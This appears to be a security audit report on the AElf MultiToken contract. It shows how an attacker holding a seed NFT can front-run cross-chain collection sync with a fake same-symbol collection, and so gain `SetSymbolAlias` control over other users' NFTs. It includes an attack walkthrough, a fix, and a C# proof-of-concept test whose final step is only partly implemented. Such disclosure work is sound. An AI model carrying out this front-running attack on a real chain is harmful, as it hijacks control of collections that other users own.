# Audit Report

## Title
NFT Collection Impersonation via Front-Running CrossChainCreateToken

## Summary
The `CrossChainCreateToken` function in the MultiToken contract fails to validate that existing NFT collection properties match those from the source chain during cross-chain synchronization. An attacker can front-run legitimate collection synchronization by creating a fake collection with the same symbol on the main chain, causing cross-chain NFT items to reference the attacker's malicious collection and granting them unauthorized control over collection-owner-gated operations.

## Finding Description

The vulnerability exists in the `CrossChainCreateToken` method's handling of NFT collections during cross-chain token creation. When an NFT collection is synchronized from a side chain to the main chain, the function calls `AssertNftCollectionExist` to verify the collection exists, but critically discards the returned collection information without comparing it against the properties being synchronized from the source chain. [1](#0-0) 

The function then constructs a new `TokenInfo` object using properties from the cross-chain input, but if a collection with that symbol already exists on the destination chain, it only updates alias information and returns without validation or overwriting. [2](#0-1) 

This differs fundamentally from local NFT creation, where `CreateNFTInfo` properly validates that the NFT's properties match the collection's properties, including IssueChainId and Owner validation. [3](#0-2) 

On the main chain (where `State.SideChainCreator.Value == null`), anyone possessing a valid seed NFT can create NFT collections locally, enabling the attack vector. [4](#0-3) 

**Attack Flow:**
1. Legitimate user creates NFT collection "COLLECTION-0" on side chain with Owner=Alice, IssueChainId=SideChainId
2. Attacker monitors cross-chain synchronization attempts
3. Attacker front-runs by creating "COLLECTION-0" on main chain with Owner=Attacker, IssueChainId=MainChainId (using a seed NFT)
4. When the legitimate `CrossChainCreateToken` executes, it sees the collection already exists and only updates alias information
5. Later, NFT items "COLLECTION-1", "COLLECTION-2" are synchronized with their correct properties from the side chain
6. Operations like `SetSymbolAlias` check the collection owner/issuer for permissions, but now reference the attacker's fake collection

The `SetSymbolAlias` method demonstrates the permission bypass: [5](#0-4) 

This check validates against the attacker's fake collection rather than the legitimate collection from the source chain.

## Impact Explanation

This vulnerability has **Medium** severity with the following impacts:

1. **Unauthorized Permission Control**: The attacker gains control over collection-owner-gated operations (specifically `SetSymbolAlias`) for NFT items they do not legitimately own. This allows them to set aliases for NFTs belonging to other users.

2. **Loss of Legitimate Control**: The actual NFT collection owner from the source chain loses the ability to perform collection-owner-restricted operations on their own NFTs on the destination chain.

3. **Cross-Chain Integrity Violation**: NFT items synchronized from the side chain reference a collection with fundamentally different properties (different Owner, Issuer, and IssueChainId), breaking the security invariant that NFT items must belong to collections from the same issuance context.

4. **Persistent State Corruption**: Once the fake collection is created, it cannot be overwritten by legitimate cross-chain synchronization. The corrupted state persists indefinitely.

While this vulnerability does not directly result in fund theft, it represents a serious breach of ownership and authorization controls in the NFT system, with potential economic significance for valuable NFT collections where alias control or other collection-owner operations have value.

## Likelihood Explanation

The likelihood of exploitation is **Medium-High** with the following factors:

**Attacker Requirements:**
- Must acquire a valid seed NFT (bounded cost through normal creation mechanisms)
- Must monitor mempool or cross-chain events to detect collection synchronization attempts
- Must successfully front-run the legitimate `CrossChainCreateToken` transaction

**Feasibility:**
- The attack specifically targets synchronization FROM side chains TO main chain, as side chains prevent local collection creation through the `State.SideChainCreator.Value` check
- Front-running is achievable through mempool monitoring or higher gas fees
- No automatic detection mechanism exists to alert legitimate users of the property mismatch
- The fake collection appears valid on-chain without cross-chain property comparison

**Exploitation Timing:**
- A timing window exists during any NFT collection cross-chain synchronization
- Attackers can prepare in advance once they identify valuable collections on side chains

The primary barrier is seed NFT acquisition cost, but this represents a one-time bounded investment that enables attacks on multiple collections.

## Recommendation

Add validation in `CrossChainCreateToken` to verify that when a collection already exists, its properties match those from the source chain:

```csharp
public override Empty CrossChainCreateToken(CrossChainCreateTokenInput input)
{
    // ... existing validation code ...
    
    var validateTokenInfoExistsInput =
        ValidateTokenInfoExistsInput.Parser.ParseFrom(originalTransaction.Params);
    
    // Capture the returned collection info instead of discarding it
    var existingCollectionInfo = AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
    
    var tokenInfo = new TokenInfo
    {
        Symbol = validateTokenInfoExistsInput.Symbol,
        TokenName = validateTokenInfoExistsInput.TokenName,
        TotalSupply = validateTokenInfoExistsInput.TotalSupply,
        Decimals = validateTokenInfoExistsInput.Decimals,
        Issuer = validateTokenInfoExistsInput.Issuer,
        IsBurnable = validateTokenInfoExistsInput.IsBurnable,
        IssueChainId = validateTokenInfoExistsInput.IssueChainId,
        ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
        Owner = validateTokenInfoExistsInput.Owner ?? validateTokenInfoExistsInput.Issuer
    };

    var isSymbolAliasSet = SyncSymbolAliasFromTokenInfo(tokenInfo);
    if (State.TokenInfos[tokenInfo.Symbol] == null)
    {
        RegisterTokenInfo(tokenInfo);
        // ... existing event firing ...
    }
    else
    {
        // NEW: If it's an NFT collection, validate properties match
        if (existingCollectionInfo != null)
        {
            var existingToken = State.TokenInfos[tokenInfo.Symbol];
            Assert(existingToken.Owner == tokenInfo.Owner, 
                "Cross-chain collection owner mismatch.");
            Assert(existingToken.Issuer == tokenInfo.Issuer, 
                "Cross-chain collection issuer mismatch.");
            Assert(existingToken.IssueChainId == tokenInfo.IssueChainId, 
                "Cross-chain collection IssueChainId mismatch.");
        }
        
        // ... existing alias update code ...
    }

    return new Empty();
}
```

Alternatively, consider preventing local NFT collection creation on the main chain for symbols that don't yet have corresponding seed NFTs, or implement a registration system that reserves collection symbols before cross-chain synchronization.

## Proof of Concept

```csharp
[Fact]
public async Task CrossChainCreateToken_NFTCollection_FrontRunning_Attack_Test()
{
    await GenerateSideChainAsync();
    await RegisterSideChainContractAddressOnMainChainAsync();
    
    const string nftSymbol = "ATTACK-0";
    
    // Step 1: Legitimate user creates NFT collection on side chain
    var sideChainCreateResult = await SideChainTokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = nftSymbol,
        TokenName = "Legitimate Collection",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = DefaultAccount.Address, // Legitimate owner
        IsBurnable = true,
        IssueChainId = SideChainId,
        Owner = DefaultAccount.Address
    });
    sideChainCreateResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 2: Attacker front-runs by creating fake collection on main chain
    // (Assuming attacker has a seed NFT for this symbol)
    var attackerAccount = Accounts[1].Address;
    var attackerCreateResult = await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = nftSymbol,
        TokenName = "Fake Collection",
        TotalSupply = 1000,
        Decimals = 0,
        Issuer = attackerAccount, // Attacker as issuer
        IsBurnable = true,
        IssueChainId = MainChainId,
        Owner = attackerAccount // Attacker as owner
    });
    attackerCreateResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 3: Legitimate cross-chain sync attempts to create collection
    var legitimateTokenInfo = await SideChainTokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = nftSymbol });
    var validationTx = CreateTokenInfoValidationTransaction(legitimateTokenInfo, SideChainTokenContractStub);
    var blockExecutedSet = await SideChainTestKit.MineAsync(new List<Transaction> { validationTx });
    var merklePath = GetTransactionMerklePathAndRoot(validationTx, out var blockRoot);
    await IndexMainChainTransactionAsync(blockExecutedSet.Height, blockRoot, blockRoot);
    
    var crossChainResult = await TokenContractStub.CrossChainCreateToken.SendAsync(
        new CrossChainCreateTokenInput
        {
            FromChainId = SideChainId,
            ParentChainHeight = blockExecutedSet.Height,
            TransactionBytes = validationTx.ToByteString(),
            MerklePath = merklePath
        });
    crossChainResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 4: Verify the fake collection persists (attacker still owns it)
    var mainChainCollectionInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = nftSymbol });
    mainChainCollectionInfo.Owner.ShouldBe(attackerAccount); // Attacker's fake collection persists!
    mainChainCollectionInfo.IssueChainId.ShouldBe(MainChainId); // Wrong IssueChainId
    
    // Step 5: Demonstrate attacker can control SetSymbolAlias for NFTs they don't own
    var nftItemSymbol = "ATTACK-1";
    // Sync NFT item from side chain (would have legitimate owner properties)
    // Then attacker can call SetSymbolAlias because they own the fake collection
    var setAliasResult = await GetTokenContractStub(attackerAccount).SetSymbolAlias.SendAsync(
        new SetSymbolAliasInput
        {
            Symbol = nftItemSymbol,
            Alias = "STOLEN_ALIAS"
        });
    // This should fail but would succeed due to the vulnerability
    setAliasResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
}
```

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L51-65)
```csharp
        if (symbolType == SymbolType.Token || symbolType == SymbolType.NftCollection)
        {
            // can not call create on side chain
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L491-491)
```csharp
        AssertNftCollectionExist(validateTokenInfoExistsInput.Symbol);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L506-531)
```csharp
        if (State.TokenInfos[tokenInfo.Symbol] == null)
        {
            RegisterTokenInfo(tokenInfo);
            Context.Fire(new TokenCreated
            {
                Symbol = validateTokenInfoExistsInput.Symbol,
                TokenName = validateTokenInfoExistsInput.TokenName,
                TotalSupply = validateTokenInfoExistsInput.TotalSupply,
                Decimals = validateTokenInfoExistsInput.Decimals,
                Issuer = validateTokenInfoExistsInput.Issuer,
                IsBurnable = validateTokenInfoExistsInput.IsBurnable,
                IssueChainId = validateTokenInfoExistsInput.IssueChainId,
                ExternalInfo = new ExternalInfo { Value = { validateTokenInfoExistsInput.ExternalInfo } },
                Owner = tokenInfo.Owner,
            });
        }
        else
        {
            if (isSymbolAliasSet &&
                validateTokenInfoExistsInput.ExternalInfo.TryGetValue(TokenContractConstants.TokenAliasExternalInfoKey,
                    out var tokenAliasSetting))
            {
                State.TokenInfos[tokenInfo.Symbol].ExternalInfo.Value
                    .Add(TokenContractConstants.TokenAliasExternalInfoKey, tokenAliasSetting);
            }
        }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L760-761)
```csharp
        Assert(collectionTokenInfo.Owner == Context.Sender || collectionTokenInfo.Issuer == Context.Sender,
            "No permission.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L17-36)
```csharp
        var nftCollectionInfo = AssertNftCollectionExist(input.Symbol);
        input.IssueChainId = input.IssueChainId == 0 ? nftCollectionInfo.IssueChainId : input.IssueChainId;
        Assert(
            input.IssueChainId == nftCollectionInfo.IssueChainId,
            "NFT issue ChainId must be collection's issue chainId");
        if (nftCollectionInfo.ExternalInfo != null && nftCollectionInfo.ExternalInfo.Value.TryGetValue(
                TokenContractConstants.NftCreateChainIdExternalInfoKey,
                out var nftCreateChainId) && long.TryParse(nftCreateChainId, out var nftCreateChainIdLong))
        {
            Assert(nftCreateChainIdLong == Context.ChainId,
                "NFT create ChainId must be collection's NFT create chainId");
        }
        else
        {
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
        }
        
        var owner = nftCollectionInfo.Owner ?? nftCollectionInfo.Issuer;
        Assert(Context.Sender == owner && owner == input.Owner, "NFT owner must be collection's owner");
```
